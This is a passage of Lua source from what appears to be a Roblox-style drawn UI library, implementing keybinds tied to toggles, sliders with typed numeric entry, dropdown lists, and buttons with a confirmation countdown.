                                objs.keyText.ThemeColor = 'Accent';
                            end)
    
                            utility:Connection(objs.holder.MouseLeave, function()
                                objs.keyText.ThemeColor = bind.binding and 'Accent' or 'Option Text 3';
                            end)
    
                            utility:Connection(objs.holder.MouseButton1Down, function()
                                if not bind.binding then
                                    bind:SetKeyText('...');
                                    bind.bindingStarted = os.clock();
                                    bind.binding = true;
                                end
                            end)
    
                        end
                        ----------------------
    
                        local c
                        function bind:SetBind(keybind)
                            if c then
                                c:Disconnect();
                                c = nil;
                                if bind.flag then
                                    library.flags[bind.flag] = false;
                                end
                                bind.callback(false);
                            end
                            local keyName = 'NONE'
                            -- false/nil means "cancelled" (blacklisted key), keep the previous bind
                            if keybind == 'none' or typeof(keybind) == 'EnumItem' then
                                self.bind = keybind
                            end
                            if self.bind == Enum.KeyCode.Backspace or self.bind == 'none' then
                                self.bind = 'none';
                            else
                                keyName = getKeyName(self.bind)
                            end
                            if not bind.linked then
                                if bind.separate then
                                    -- a separate key starts off whenever it's set or cleared (unbound = never on)
                                    local wasOn = bind.state
                                    bind.state = false
                                    if bind.flag then
                                        library.flags[bind.flag] = false;
                                    end
                                    if wasOn then
                                        self.callback(false)
                                    end
                                    bind.indicatorValue:SetEnabled((bind.invertindicator and self.bind ~= 'none') and not bind.noindicator);
                                else
                                    -- a key that drives its toggle just mirrors the toggle
                                    bind.state = toggle.state == true
                                    if bind.flag then
                                        library.flags[bind.flag] = bind.state;
                                    end
                                    bind.indicatorValue:SetEnabled(bind.state and self.bind ~= 'none' and not bind.noindicator);
                                end
                            end
                            self.keycallback(self.bind);
                            self:SetKeyText(keyName:upper());
                            self.indicatorValue:SetKey((self.text == nil or self.text == '') and (self.flag == nil and 'unknown' or self.flag) or self.text); -- this is so dumb
                            self.indicatorValue:SetValue('['..keyName:upper()..']');
                            self.objects.keyText.ThemeColor = self.objects.holder.Hover and 'Accent' or 'Option Text 3';
                            self:RefreshIndicator();
                        end

                        -- linked binds show in the keybind list while their toggle is on and a key is set
                        function bind:RefreshIndicator()
                            if not self.linked then return end
                            self.indicatorValue:SetKey((toggle.text ~= nil and toggle.text ~= '') and toggle.text or (toggle.flag or 'unknown'));
                            self.indicatorValue:SetValue('['..getKeyName(self.bind):upper()..']');
                            self.indicatorValue:SetEnabled(toggle.state == true and self.bind ~= 'none' and not self.noindicator);
                        end
    
                        function bind:SetKeyText(str)
                            str = tostring(str);
                            self.objects.keyText.Text = '['..str..']';
                            self.objects.keyText.Position = newUDim2(0, 2, 0, 5);
                            self.objects.holder.Size = newUDim2(0,self.objects.keyText.TextBounds.X+2,0,24)
                            toggle:UpdateOptions();
                        end
    
                        utility:Connection(inputservice.InputBegan, function(inp)
                            if inputservice:GetFocusedTextBox() or library:IsTyping() then
                                return
                            elseif bind.binding then
                                -- ignore the same click that started binding
                                if inp.UserInputType == Enum.UserInputType.MouseButton1 and os.clock() - (bind.bindingStarted or 0) < 0.05 then
                                    return
                                end
                                local key = getInputKey(inp, bind.nomouse)
                                -- for toggle keybinds, left click cancels instead of binding (it would flip the toggle on every click)
                                if bind.linked and inp.UserInputType == Enum.UserInputType.MouseButton1 then
                                    key = false
                                end
                                bind:SetBind(key)
                                bind.binding = false
                            elseif bind.linked or not bind.separate then
                                -- the bound key drives the toggle it sits on
                                if bind.bind ~= 'none' and (inp.KeyCode == bind.bind or inp.UserInputType == bind.bind) then
                                    if bind.mode == 'hold' and not bind.linked then
                                        bind.holding = true
                                        toggle:SetState(true);
                                    else
                                        toggle:SetState(not toggle.state);
                                    end
                                    if not bind.linked then
                                        bind.callback(toggle.state)
                                    end
                                end
                            elseif bind.bind ~= 'none' and (inp.KeyCode == bind.bind or inp.UserInputType == bind.bind) and not bind.binding then
                                if bind.mode == 'toggle' then
                                    bind.state = not bind.state
                                    if bind.flag then
                                        library.flags[bind.flag] = bind.state;
                                    end
                                    bind.callback(bind.state)
                                    local display = bind.state; if bind.invertindicator then display = not bind.state; end
                                    bind.indicatorValue:SetEnabled(display and not bind.noindicator);
                                elseif bind.mode == 'hold' then
                                    if bind.flag then
                                        library.flags[bind.flag] = true;
                                    end
                                    bind.indicatorValue:SetEnabled((not bind.invertindicator and true or false) and not bind.noindicator);
                                    c = utility:Connection(runservice.RenderStepped, function()
                                        if bind.callback then
                                            bind.callback(true);
                                        end
                                    end)
                                end
                            end
                        end)
    
                        utility:Connection(inputservice.InputEnded, function(inp)
                            if bind.bind ~= 'none' then
                                if inp.KeyCode == bind.bind or inp.UserInputType == bind.bind then
                                    -- hold mode on a toggle: let go = toggle off
                                    if bind.holding then
                                        bind.holding = false
                                        toggle:SetState(false);
                                        bind.callback(false)
                                    end
                                    if c then
                                        c:Disconnect();
                                        c = nil;
                                        if bind.flag then
                                            library.flags[bind.flag] = false;
                                        end
                                        if bind.callback then
                                            bind.callback(false);
                                        end
                                        bind.indicatorValue:SetEnabled((bind.invertindicator and true or false) and not bind.noindicator);
                                    end
                                end
                            end
                        end)
    
                        tooltip(bind);
                        bind:SetBind(bind.bind);
                        self:UpdateOptions();
                        return bind
                    end

                    function toggle:AddSlider(data)
                        local slider = {
                            class = 'slider';
                            flag = data.flag;
                            suffix = '';
                            tooltip = '';
                            order = #self.options+1;
                            value = 0;
                            min = 0;
                            max = 100;
                            increment = 1;
                            callback = function() end;
                            enabled = true;
                            dragging = false;
                            focused = false;
                            objects = {};
                        };
    
                        local blacklist = {'objects', 'dragging'};
                        for i,v in next, data do
                            if not table.find(blacklist, i) and (slider[i] ~= nil and typeof(slider[i]) == typeof(v)) then
                                slider[i] = v;
                            end
                        end
                
                        table.insert(self.options, slider)

                        if slider.flag then
                            library.flags[slider.flag] = slider.value;
                            library.options[slider.flag] = slider;
                        end

                        --- Create Objects ---
                        do
                            local objs = slider.objects;
                            local z = library.zindexOrder.window+25;

                            objs.holder = utility:Draw('Square', {
                                Size = newUDim2(1,0,0,24);
                                Transparency = 0;
                                ZIndex = z+6;
                                Parent = toggle.objects.holder;
                            })

                            objs.background = utility:Draw('Square', {
                                Size = newUDim2(1,-4,1,-8);
                                Position = newUDim2(0,2,0,4);
                                ThemeColor = 'Option Background';
                                ZIndex = z+2;
                                Parent = objs.holder;
                            })

                            objs.slider = utility:Draw('Square', {
                                Size = newUDim2(0,0,1,0);
                                ThemeColor = 'Accent';
                                ZIndex = z+3;
                                Parent = objs.background;
                            })

                            objs.border1 = utility:Draw('Square', {
                                Size = newUDim2(1,2,1,2);
                                Position = newUDim2(0,-1,0,-1);
                                ThemeColor = 'Option Border 1';
                                ZIndex = z+1;
                                Parent = objs.background;
                            })

                            objs.border2 = utility:Draw('Square', {
                                Size = newUDim2(1,2,1,2);
                                Position = newUDim2(0,-1,0,-1);
                                ThemeColor = 'Option Border 2';
                                ZIndex = z;
                                Parent = objs.border1;
                            })
    
                            objs.gradient = utility:Draw('Image', {
                                Size = newUDim2(1,0,1,0);
                                Data = library.images.gradientp90;
                                Visible = false; -- flat look (gradient kept for scripts that want it back)
                                Transparency = .65;
                                ZIndex = z+4;
                                Parent = objs.background;
                            })
    
                            objs.text = utility:Draw('Text', {
                                Position = newUDim2(.5,0,0,1);
                                ThemeColor = 'Option Text 3';
                                Size = 13;
                                Font = 2;
                                ZIndex = z+5;
                                Outline = true;
                                Center = true;
                                Parent = objs.background;
                            })

                            utility:Connection(objs.holder.MouseEnter, function()
                                objs.border1.ThemeColor = 'Accent';
                            end)
    
                            utility:Connection(objs.holder.MouseLeave, function()
                                objs.border1.ThemeColor = slider.dragging and 'Accent' or 'Option Border 1';
                            end)
    
                            local c;
                            local inputNumber = '';
                            utility:Connection(slider.objects.holder.MouseButton1Down, function()
                                if inputservice:IsKeyDown(Enum.KeyCode.LeftControl) then
                                    if slider.focused then
                                        slider.focused = false;
                                        c:Disconnect();
                                    else
                                        objs.text.Text = tostring(slider.value)..tostring(slider.suffix)..'/'..tostring(slider.max)..tostring(slider.suffix)..' []';
                                        slider.focused = true;
                                        inputNumber = '';
                                        c = utility:Connection(inputservice.InputBegan, function(inp)
                                            if library.numberStrings[inp.KeyCode.Name] then
                                                local number = library.numberStrings[inp.KeyCode.Name];
                                                inputNumber = inputNumber..tostring(number);
                                                objs.text.Text = string.format("%.14g", slider.value) .. tostring(slider.suffix) .. "/" .. slider.max .. tostring(slider.suffix) .. " [" .. inputNumber .. "]";
                                            elseif inp.KeyCode == Enum.KeyCode.Backspace then
                                                inputNumber = inputNumber:sub(1,-2);
                                                objs.text.Text = string.format("%.14g", slider.value)..tostring(slider.suffix)..'/'..slider.max..tostring(slider.suffix)..' ['..inputNumber..']';
                                            elseif inp.KeyCode == Enum.KeyCode.Return then
                                                slider:SetValue(tonumber(inputNumber))
                                                slider.focused = false;
                                                c:Disconnect();
                                            elseif inp.KeyCode == Enum.KeyCode.Escape then
                                                slider:SetValue(slider.value, true)
                                                slider.focused = false;
                                                c:Disconnect();
                                            end
                                        end)
                                    end
                                else
                                    slider.dragging = true;
                                    library.draggingSlider = slider;
                                end
                            end)
    
                            utility:Connection(button1up, function()
                                objs.border1.ThemeColor = objs.holder.Hover and 'Accent' or 'Option Border 1';
                                slider.dragging = false;
                                library.draggingSlider = nil;
                            end)
    
                        end
                        ----------------------
    
                        function slider:SetValue(value, nocallback)
                            if typeof(value) == 'number' then
                                local newValue = snapToIncrement(value, self.increment, self.min, self.max);
                                local size, pos = self.objects.slider.Size, self.objects.slider.Position;
    
                                if self.min >= 0 then
                                    size, pos = sliderFill(self.min, self.max, newValue);
                                else
                                    size, pos = sliderFill(self.min, self.max, newValue);
                                    -- negative ranges fill outwards from 0 (handled in sliderFill)
                                end
    
                                utility:Tween(self.objects.slider, 'Size', size, .05, Enum.EasingDirection.Out, Enum.EasingStyle.Quad);
                                utility:Tween(self.objects.slider, 'Position', pos, .05, Enum.EasingDirection.Out, Enum.EasingStyle.Quad);
    
                                self.value = newValue;
                                if self.flag then
                                    library.flags[self.flag] = newValue;
                                end
                                self.objects.text.Text = string.format("%.14g",newValue)..tostring(self.suffix)..'/'..self.max..tostring(self.suffix);
                                self.objects.text.ThemeColor = (self.min < 0 and newValue == 0 or newValue == self.min)  and (self.risky and 'Risky Text' or 'Option Text 3') or (self.risky and 'Risky Text Enabled' or 'Option Text 1');
    
                                if not nocallback then
                                    self.callback(newValue);
                                end
    
                            end
                        end

                        tooltip(slider);
                        slider:SetValue(slider.value, true);
                        self:UpdateOptions();
                        return slider
                    end

                    function toggle:AddList(data)
                        local list = {
                            class = 'list';
                            flag = data.flag;
                            text = '';
                            selected = '';
                            tooltip = '';
                            order = #self.options+1;
                            callback = function() end;
                            enabled = true;
                            multi = false;
                            maxVisible = false; -- rows shown before scrolling (false = window default)
                            open = false;
                            values = {};
                            objects = {};
                        }
    
                        table.insert(self.options, list);
    
                        local blacklist = {'objects'};
                        for i,v in next, data do
                            if not table.find(blacklist, i) and list[i] ~= nil then
                                list[i] = v
                            end
                        end
    
                        if list.flag then
                            library.flags[list.flag] = list.selected;
                            library.options[list.flag] = list;
                        end
    
                        -- Create Objects --
                        do
                            local objs = list.objects;
                            local z = library.zindexOrder.window+25;
    
                            objs.holder = utility:Draw('Square', {
                                Size = newUDim2(1,0,0,26);
                                Transparency = 0;
                                ZIndex = z+6;
                                Parent = toggle.objects.holder;
                            })
    
                            objs.background = utility:Draw('Square', {
                                Size = newUDim2(1,-4,1,-8);
                                Position = newUDim2(0,2,0,4);
                                ThemeColor = 'Option Background';
                                ZIndex = z+2;
                                Parent = objs.holder;
                            })
    
                            objs.border1 = utility:Draw('Square', {
                                Size = newUDim2(1,2,1,2);
                                Position = newUDim2(0,-1,0,-1);
                                ThemeColor = 'Option Border 1';
                                ZIndex = z+1;
                                Parent = objs.background;
                            })
    
                            objs.border2 = utility:Draw('Square', {
                                Size = newUDim2(1,2,1,2);
                                Position = newUDim2(0,-1,0,-1);
                                ThemeColor = 'Option Border 2';
                                ZIndex = z;
                                Parent = objs.border1;
                            })
    
                            objs.gradient = utility:Draw('Image', {
                                Size = newUDim2(1,0,1,0);
                                Data = library.images.gradientp90;
                                Visible = false; -- flat look (gradient kept for scripts that want it back)
                                Transparency = .65;
                                ZIndex = z+4;
                                Parent = objs.background;
                            })
    
                            objs.inputText = utility:Draw('Text', {
                                Position = newUDim2(0,4,0,2);
                                ThemeColor = 'Option Text 2';
                                Text = 'none',
                                Size = 13;
                                Font = 2;
                                ZIndex = z+5;
                                Outline = true;
                                Parent = objs.background;
                            })
    
                            objs.openText = utility:Draw('Text', {
                                Position = newUDim2(1,-10,0,2);
                                ThemeColor = 'Option Text 3';
                                Text = '+';
                                Size = 13;
                                Font = 2;
                                ZIndex = z+5;
                                Outline = true;
                                Parent = objs.background;
                            })
    
                            utility:Connection(objs.holder.MouseEnter, function()
                                objs.border1.ThemeColor = 'Accent';
                            end)
    
                            utility:Connection(objs.holder.MouseLeave, function()
                                objs.border1.ThemeColor = 'Option Border 1';
                            end)
    
                            utility:Connection(objs.holder.MouseButton1Down, function()
                                if list.open then
                                    list.open = false;
                                    objs.openText.Text = '+';
                                    if window.dropdown.selected == list then
                                        window.dropdown.selected = nil;
                                        window.dropdown.objects.background.Visible = false;
                                    end
                                else
                                    if window.dropdown.selected ~= nil then
                                        window.dropdown.selected.open = false
                                    end
                                    list.open = true;
                                    objs.openText.Text = '-';
                                    window.dropdown.selected = list;
                                    window.dropdown.objects.background.Visible = true;
                                    window.dropdown.objects.background.Parent = objs.holder;
                                    window.dropdown:Refresh();
                                    window.dropdown:AnimateOpen();
                                end
                            end)
    
    
                        end
                        --------------------
    
                        function list:Select(option, nocallback)
                            option = typeof(option) == 'table' and (self.multi == true and option or (#option == 0 and nil or option[1])) or self.multi == true and {option} or option;
                            if option ~= nil then
                                self.selected = option;
                                local text = typeof(option) == 'table' and (#option == 0 and "none" or table.concat(option, ', ')) or tostring(option);
                                local label = self.objects.inputText
                                label.Text = text;
                                if label.TextBounds.X > self.objects.background.Object.Size.X - 10 then
                                    local split = text:split('');
                                    for i = 1,#split do
                                        label.Text = table.concat(split, '', 1, i)
                                        if label.TextBounds.X > self.objects.background.Object.Size.X - 10 then
                                            label.Text = label.Text:sub(1,-6)..'...';
                                            break
                                        end
                                    end
                                end
                                if self.flag then
                                    library.flags[self.flag] = self.selected
                                end
                                if not nocallback then
                                    self.callback(self.selected);
                                end
                            end
                        end
    
                        function list:AddValue(value)
                            table.insert(list.values, tostring(value));
                            if window.dropdown.selected == list then
                                window.dropdown:Refresh()
                            end
                        end
    
                        function list:RemoveValue(value)
                            if table.find(list.values, value) then
                                table.remove(list.values, table.find(list.values, value));
                                if window.dropdown.selected == list then
                                    window.dropdown:Refresh()
                                end
                            end
                        end
    
                        function list:ClearValues()
                            table.clear(list.values);
                            if window.dropdown.selected == list then
                                window.dropdown:Refresh()
                            end
                        end
    
                        tooltip(list);
                        list:Select((data.value or data.selected) or (list.multi and 'none' or list.values[1]), true);
                        self:UpdateOptions();
                        return list
                    end

                    -- keybind that flips the toggle. starts as [NONE]; click it, press a key, Backspace clears it.
                    -- the bind is saved in configs as '<flag>_bind'
                    function toggle:AddKeybind(bindData)
                        if self.linkedBind then
                            return self.linkedBind
                        end
                        bindData = typeof(bindData) == 'table' and bindData or {}
                        self.linkedBind = self:AddBind({
                            linked = true,
                            bind = bindData.bind or 'none',
                            flag = bindData.flag or (self.flag and self.flag..'_bind') or nil,
                            nomouse = bindData.nomouse == true,
                            noindicator = bindData.noindicator == true,
                            tooltip = bindData.tooltip or '',
                        })
                        return self.linkedBind
                    end

                    tooltip(toggle);
                    toggle:SetText(toggle.text);
                    -- starting look is applied instantly (no color easing), so a default-on toggle
                    -- always shows its checkmark even if another animation interrupts
                    do
                        local objs = toggle.objects
                        local animated = {objs.background, objs.border1, objs.text, objs.knob}
                        for _, d in ipairs(animated) do d.ColorTween = 0 end
                        toggle:SetState(toggle.state, true);
                        for _, d in ipairs(animated) do d.ColorTween = library.animations.color end
                    end
                    if toggle.keybind then
                        toggle:AddKeybind(typeof(data.keybind) == 'table' and data.keybind or nil);
                    end

                    -- tracked so Unload can switch everything off (see library:Unload)
                    library.allToggles = library.allToggles or {};
                    table.insert(library.allToggles, toggle);

                    -- a toggle that starts on actually runs its callback, so the feature matches the checkmark.
                    -- deferred so the rest of the script (other options, variables) exists first
                    if toggle.state == true then
                        task.defer(function()
                            if toggle.state == true and library.hasInit and not toggle.startupFired then
                                toggle.startupFired = true;
                                local ok, err = pcall(toggle.callback, true);
                                if not ok then
                                    log('toggle callback error ('..tostring(toggle.text)..'): '..tostring(err));
                                end
                            end
                        end)
                    end

                    self:UpdateOptions();
                    return toggle
                end

                -- // Slider
                function section:AddSlider(data)
                    local slider = {
                        class = 'slider';
                        flag = data.flag;
                        text = '';
                        tooltip = '';
                        suffix = '';
                        order = #self.options+1;
                        value = 0;
                        min = 0;
                        max = 100;
                        increment = 1;
                        callback = function() end;
                        enabled = true;
                        dragging = false;
                        focused = false;
                        risky = false;
                        objects = {};
                    };

                    local blacklist = {'objects', 'dragging'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) and (slider[i] ~= nil and typeof(slider[i]) == typeof(v)) then
                            slider[i] = v;
                        end
                    end
                    
                    table.insert(self.options, slider)

                    if slider.flag then
                        library.flags[slider.flag] = slider.value;
                        library.options[slider.flag] = slider;
                    end

                    --- Create Objects ---
                    do
                        local objs = slider.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Size = newUDim2(1,0,0,40);
                            Transparency = 0;
                            ZIndex = z+4;
                            Parent = section.objects.optionholder;
                        })

                        objs.background = utility:Draw('Square', {
                            Size = newUDim2(1,-8,0,8);
                            Position = newUDim2(0,4,1,-14);
                            ThemeColor = 'Option Background';
                            ZIndex = z+2;
                            Parent = objs.holder;
                        })

                        objs.slider = utility:Draw('Square', {
                            Size = newUDim2(0,0,1,0);
                            ThemeColor = 'Accent';
                            ZIndex = z+3;
                            Parent = objs.background;
                        })

                        -- knob riding on the end of the fill (children follow the fill's tween for free)
                        objs.knob = utility:Draw('Square', {
                            Size = newUDim2(0,6,1,8);
                            Position = newUDim2(1,-3,0,-4);
                            ThemeColor = 'Option Text 1';
                            ZIndex = z+6;
                            NoHit = true;
                            Parent = objs.slider;
                        })

                        objs.knobBorder = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z+5;
                            NoHit = true;
                            Parent = objs.knob;
                        })

                        objs.border1 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 1';
                            ZIndex = z+1;
                            Parent = objs.background;
                        })

                        objs.border2 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z;
                            Parent = objs.border1;
                        })

                        objs.gradient = utility:Draw('Image', {
                            Size = newUDim2(1,0,1,0);
                            Data = library.images.gradientp90;
                            Visible = false; -- flat look (gradient kept for scripts that want it back)
                            Transparency = .65;
                            ZIndex = z+4;
                            Parent = objs.background;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(0,4,0,4);
                            ThemeColor = 'Option Text 3';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+1;
                            Outline = true;
                            Parent = objs.holder;
                        })

                        objs.plusDetector = utility:Draw('Square', {
                            Size = newUDim2(0,16,0,16);
                            Position = newUDim2(1,-34,0,3);
                            Transparency = 0;
                            ZIndex = z+5;
                            Parent = objs.holder;
                        })

                        objs.minusDetector = utility:Draw('Square', {
                            Size = newUDim2(0,16,0,16);
                            Position = newUDim2(1,-18,0,3);
                            Transparency = 0;
                            ZIndex = z+5;
                            Parent = objs.holder;
                        })

                        objs.plusText = utility:Draw('Text', {
                            Position = newUDim2(.5,0,0,1);
                            ThemeColor = 'Option Text 3';
                            Text = '+';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+4;
                            Center = true;
                            Outline = true;
                            Parent = objs.plusDetector;
                        })

                        objs.minusText = utility:Draw('Text', {
                            Position = newUDim2(.5,0,0,1);
                            ThemeColor = 'Option Text 3';
                            Text = '-';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+4;
                            Center = true;
                            Outline = true;
                            Parent = objs.minusDetector;
                        })

                        utility:Connection(objs.holder.MouseEnter, function()
                            objs.border1.ThemeColor = 'Accent';
                        end)

                        utility:Connection(objs.holder.MouseLeave, function()
                            objs.border1.ThemeColor = slider.dragging and 'Accent' or 'Option Border 1';
                        end)

                        utility:Connection(slider.objects.plusDetector.MouseButton1Down,function()
                            slider:SetValue(slider.value + (inputservice:IsKeyDown(Enum.KeyCode.LeftShift) and 10 or slider.increment))
                        end)
    
                        utility:Connection(slider.objects.minusDetector.MouseButton1Down,function()
                            slider:SetValue(slider.value - (inputservice:IsKeyDown(Enum.KeyCode.LeftShift) and 10 or slider.increment))
                        end)


                        local c;
                        local inputNumber = '';
                        utility:Connection(slider.objects.holder.MouseButton1Down, function()
                            if inputservice:IsKeyDown(Enum.KeyCode.LeftControl) then
                                if slider.focused then
                                    slider.focused = false;
                                    c:Disconnect();
                                else
                                    objs.text.Text = slider.text..': '..tostring(slider.value)..tostring(slider.suffix)..' []';
                                    slider.focused = true;
                                    inputNumber = '';
                                    c = utility:Connection(inputservice.InputBegan, function(inp)
                                        if library.numberStrings[inp.KeyCode.Name] then
                                            local number = library.numberStrings[inp.KeyCode.Name];
                                            inputNumber = inputNumber..tostring(number);
                                            objs.text.Text = slider.text..': '..string.format("%.14g",slider.value)..tostring(slider.suffix)..' ['..inputNumber..']';
                                        elseif inp.KeyCode == Enum.KeyCode.Backspace then
                                            inputNumber = inputNumber:sub(1,-2);
                                            objs.text.Text = slider.text..': '..string.format("%.14g",slider.value)..tostring(slider.suffix)..' ['..inputNumber..']';
                                        elseif inp.KeyCode == Enum.KeyCode.Return then
                                            slider:SetValue(tonumber(inputNumber))
                                            slider.focused = false;
                                            c:Disconnect();
                                        elseif inp.KeyCode == Enum.KeyCode.Escape then
                                            slider:SetValue(slider.value, true)
                                            slider.focused = false;
                                            c:Disconnect();
                                        end
                                    end)

                                end


                            else
                                slider.dragging = true;
                                library.draggingSlider = slider;
                            end
                        end)

                        utility:Connection(button1up, function()
                            objs.border1.ThemeColor = objs.holder.Hover and 'Accent' or 'Option Border 1';
                            slider.dragging = false;
                            library.draggingSlider = nil;
                        end)

                    end
                    ----------------------

                    function slider:SetValue(value, nocallback)
                        if typeof(value) == 'number' then
                            local newValue = snapToIncrement(value, self.increment, self.min, self.max);
                            local size, pos = self.objects.slider.Size, self.objects.slider.Position;

                            if self.min >= 0 then
                                size, pos = sliderFill(self.min, self.max, newValue);
                            else
                                size, pos = sliderFill(self.min, self.max, newValue);
                                -- negative ranges fill outwards from 0 (handled in sliderFill)
                            end

                            utility:Tween(self.objects.slider, 'Size', size, .05, Enum.EasingDirection.Out, Enum.EasingStyle.Quad);
                            utility:Tween(self.objects.slider, 'Position', pos, .05, Enum.EasingDirection.Out, Enum.EasingStyle.Quad);

                            -- the knob sits on the value end of the fill (the left end for negative values)
                            if self.objects.knob then
                                self.objects.knob.Position = (self.min < 0 and newValue < 0) and newUDim2(0,-3,0,-4) or newUDim2(1,-3,0,-4);
                            end

                            self.value = newValue;
                            if self.flag then
                                library.flags[self.flag] = newValue;
                            end
                            self.objects.text.Text = slider.text..': '..string.format("%.14g",newValue)..tostring(self.suffix);
                            self.objects.text.ThemeColor = (self.min < 0 and newValue == 0 or newValue == self.min)  and (self.risky and 'Risky Text' or 'Option Text 3') or (self.risky and 'Risky Text Enabled' or 'Option Text 1');

                            if not nocallback then
                                self.callback(newValue);
                            end

                        end
                    end

                    function slider:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str..': '..tostring(self.value)..tostring(self.suffix);
                        end
                    end

                    tooltip(slider);
                    slider:SetText(slider.text);
                    slider:SetValue(slider.value, true);
                    self:UpdateOptions();
                    return slider
                end

                -- // Button
                function section:AddButton(data)
                    local button = {
                        class = 'button';
                        flag = data.flag;
                        text = '';
                        suffix = '';
                        tooltip = '';
                        order = #self.options+1;
                        callback = function() end;
                        confirm = false;
                        enabled = true;
                        risky = false;
                        objects = {};
                        subbuttons = {};
                    };

                    local blacklist = {'objects'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) and button[i] ~= nil then
                            button[i] = v;
                        end
                    end
        
                    table.insert(self.options, button)

                    if button.flag then
                        library.options[button.flag] = button;
                    end

                    --- Create Objects ---
                    do
                        local objs = button.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Size = newUDim2(1,0,0,30);
                            Transparency = 0;
                            ZIndex = z+4;
                            Parent = section.objects.optionholder;
                        })

                        objs.background = utility:Draw('Square', {
                            Size = newUDim2(1,-4,0,22);
                            Position = newUDim2(0,2,0,4);
                            ThemeColor = 'Option Background';
                            ZIndex = z+2;
                            Parent = objs.holder;
                        })

                        objs.border1 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 1';
                            ZIndex = z+1;
                            Parent = objs.background;
                        })

                        objs.border2 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z;
                            Parent = objs.border1;
                        })

                        objs.gradient = utility:Draw('Image', {
                            Size = newUDim2(1,0,1,0);
                            Data = library.images.gradientp90;
                            Visible = false; -- flat look (gradient kept for scripts that want it back)
                            Transparency = .65;
                            ZIndex = z+3;
                            Parent = objs.background;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(.5,0,0,4);
                            ThemeColor = 'Option Text 3';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+4;
                            Outline = true;
                            Center = true;
                            Parent = objs.background;
                        })

                        utility:Connection(objs.holder.MouseEnter, function()
                            objs.border1.ThemeColor = 'Accent';
                        end)

                        utility:Connection(objs.holder.MouseLeave, function()
                            objs.border1.ThemeColor = 'Option Border 1';
                            objs.text.ThemeColor = button.risky and 'Risky Text' or 'Option Text 3';
                            objs.background.ThemeColor = 'Option Background';
                            objs.background.ThemeColorOffset = 0;
                        end)

                        utility:Connection(objs.holder.MouseButton1Up, function()
                            objs.text.ThemeColor = button.risky and 'Risky Text' or  'Option Text 3';
                            objs.background.ThemeColor = 'Option Background';
                            objs.background.ThemeColorOffset = 0;
                        end)

                        local clicked, counting = false, false
                        utility:Connection(objs.holder.MouseButton1Down, function()
                            objs.text.ThemeColor = button.risky and 'Risky Text Enabled' or 'Option Text 2';
                            objs.background.ThemeColor = 'Accent';
                            objs.background.ThemeColorOffset = -95;

                            task.spawn(function() -- this is ugly and i do not care :)
                                if button.confirm then
                                    if clicked then
                                        clicked = false
                                        counting = false
                                        objs.text.Text = button.text
                                        button.callback()
                                    else
                                        clicked = true
                                        counting = true
                                        for i = 3,1,-1 do
                                            if not counting then
                                                break
                                            end
                                            objs.text.Text = 'Confirm '..button.text..'? '..tostring(i)
                                            task.wait(1)
                                        end
                                        clicked = false
                                        counting = false
                                        objs.text.Text = button.text
                                    end
                                else
                                    button.callback()
                                end
                            end)

                        end)

                    end
                    ----------------------
                    function button:AddButton(data)
                        local button = {
                            class = 'button';
                            flag = data.flag;
                            text = '';
                            suffix = '';
                            tooltip = '';
                            order = #self.subbuttons+1;
                            callback = function() end;
                            confirm = false;
                            enabled = true;
                            objects = {};
                        };
    
                        local blacklist = {'objects'};
                        for i,v in next, data do
                            if not table.find(blacklist, i) and button[i] ~= nil then
                                button[i] = v;
                            end
                        end
            
                        table.insert(self.subbuttons, button)
    
                        if button.flag then
                            library.options[button.flag] = button;
                        end
    
                        --- Create Objects ---
                        do
                            local objs = button.objects;
                            local z = library.zindexOrder.window+25;
    
                            objs.holder = utility:Draw('Square', {
                                Size = newUDim2(1,0,1,0);
                                Transparency = 0;
                                ZIndex = z+5;
                                Parent = self.objects.holder;
                            })
    
                            objs.background = utility:Draw('Square', {
                                Size = newUDim2(1,-4,1,-8);
                                Position = newUDim2(0,2,0,4);
                                ThemeColor = 'Option Background';
                                ZIndex = z+2;
                                Parent = objs.holder;
                            })
    
                            objs.border1 = utility:Draw('Square', {
                                Size = newUDim2(1,2,1,2);
                                Position = newUDim2(0,-1,0,-1);
                                ThemeColor = 'Option Border 1';
                                ZIndex = z+1;
                                Parent = objs.background;
                            })
    
                            objs.border2 = utility:Draw('Square', {
                                Size = newUDim2(1,2,1,2);
                                Position = newUDim2(0,-1,0,-1);
                                ThemeColor = 'Option Border 2';
                                ZIndex = z;
                                Parent = objs.border1;
                            })
    
                            objs.gradient = utility:Draw('Image', {
                                Size = newUDim2(1,0,1,0);
                                Data = library.images.gradientp90;
                                Visible = false; -- flat look (gradient kept for scripts that want it back)
                                Transparency = .65;
                                ZIndex = z+3;
                                Parent = objs.background;
                            })
    
                            objs.text = utility:Draw('Text', {
                                Position = newUDim2(.5,0,0,4);
                                ThemeColor = 'Option Text 3';
                                Size = 13;
                                Font = 2;
                                ZIndex = z+4;
                                Outline = true;
                                Center = true;
                                Parent = objs.background;
                            })
    
                            utility:Connection(objs.holder.MouseEnter, function()
                                objs.border1.ThemeColor = 'Accent';
                            end)
    
                            utility:Connection(objs.holder.MouseLeave, function()
                                objs.border1.ThemeColor = 'Option Border 1';
                                objs.text.ThemeColor = button.risky and 'Risky Text' or 'Option Text 3';
                                objs.background.ThemeColor = 'Option Background';
                                objs.background.ThemeColorOffset = 0;
                            end)
    
